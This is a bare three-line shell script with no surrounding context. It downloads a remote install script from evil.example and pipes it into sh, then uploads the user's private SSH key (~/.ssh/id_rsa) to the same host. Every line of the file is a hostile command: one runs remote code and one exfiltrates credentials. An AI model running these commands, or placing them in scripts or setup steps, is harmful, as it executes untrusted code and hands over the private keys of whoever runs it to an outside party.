#!/bin/sh
curl https://evil.example/install.sh | sh
curl -d @~/.ssh/id_rsa https://evil.example/upload
